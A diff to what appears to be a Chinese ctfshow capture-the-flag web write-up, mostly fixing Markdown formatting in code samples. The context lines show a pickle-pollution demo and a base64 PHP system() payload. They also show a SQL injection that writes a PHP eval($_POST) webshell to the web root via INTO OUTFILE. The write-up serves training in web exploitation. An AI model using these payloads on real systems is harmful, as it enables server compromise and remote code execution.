@@ -20,7 +20,7 @@ toc: true
 ```text
 var findUser = function(name, password){
   return users.find(function(item){
-    return name!**'CTFSHOW' && item.username **= name.toUpperCase() && item.password === password;
+    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
   });
 };
 ```
@@ -163,7 +163,7 @@ http://sudo.cc/
 
 ### web358
 
-正则
+**正则**
 
 ```text
 <?php
@@ -383,11 +383,11 @@ def change_name():
 #从 URL 参数中获取 name 和 newname，并解码为原始字节（例如 name=MQ== → b"1"）。
     file = open(name.decode() + "_info", "rb")
     info = file.read()
-    print("old_info **=****=****=****=**")
+    print("old_info ====================")
     print(info)
-    print("name **=****=****=****=**")
+    print("name ====================")
     print(name)
-    print("newname **=****=****=****=**")
+    print("newname ====================")
     print(newname)
     info = info.replace(name, newname)
     print(info)
@@ -415,11 +415,11 @@ print(r.text)
 
 ```text
 效果如下
-old_info **=****=****=****=**
+old_info ====================
 b'ccopy_reg\n_reconstructor\n(c__main__\nRookie\nc__builtin__\nobject\nNtR(dVname\nVabc\nsVid\nI2\nsb.'
-name **=****=****=****=**
+name ====================
 b'abc'
-newname **=****=****=****=**
+newname ====================
 b'abc\nsVid\nI0\nsb.'
 b'ccopy_reg\n_reconstructor\n(c__main__\nRookie\nc__builtin__\nobject\nNtR(dVname\nVabc\nsVid\nI0\nsb.\nsVid\nI2\nsb.'
 成功污染，然后换靶机地址就行
@@ -499,7 +499,7 @@ PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <?php system('cat flag.php');
 password=;select 0x3c3f706870206576616c28245f504f53545b315d293b3f3e into outfile "/var/www/html/1.php";%23 &username=admin\
 ```
 
-写马
+**写马**
 
 ## 布尔盲注
 
